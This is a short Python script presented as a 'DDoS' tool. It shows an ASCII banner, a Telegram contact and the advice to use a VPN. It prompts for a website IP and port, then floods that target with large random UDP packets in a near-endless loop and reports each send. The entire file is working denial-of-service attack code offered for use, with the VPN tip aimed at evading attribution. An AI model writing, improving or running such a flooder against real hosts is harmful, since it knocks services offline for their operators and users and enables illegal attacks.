import socket
import random
import time
import pyfiglet
from time import sleep
Z = '\033[1;31m'
X = '\033[1;33m'
Z1 = '\033[2;31m'
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m'
B = '\033[2;36m'
Y = '\033[1;34m'
L = '\033[1;37m'
logo1 = pyfiglet.figlet_format('X',font= '3-d')
logo2 = pyfiglet.figlet_format(text='D D o S',font='3-d')
print(f'{F}{logo1}\n{F}{logo2}')
#------
print(f'{B}-----------------------')
def text(string):
    for Str in string:
        print(Str, end="", flush=True)
        sleep(10 / 1000)

text(f'''{L}[*] Version : 2.1.1
[*] Telegram : @DF_GD_D
{X}* Note : Use VPN.
''')
print(f'{B}-----------------------')

s_d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = (input(f'{Z}Website IP : '))
port = int(input(f'{Z}Port : '))
print(f'{C}loding...')
s_d.connect((ip, port))

time.sleep(1)
for i in range(1, 1000**1000):
 s_d.send(random._urandom(10)*1000)
 try:
  print(f'{F}Sent : {i} {B}< Target : {ip} , port : {port} Successo >')
  time.sleep(0)
 except:
  print(f'{Z1} Error {B}< Error >')
  pass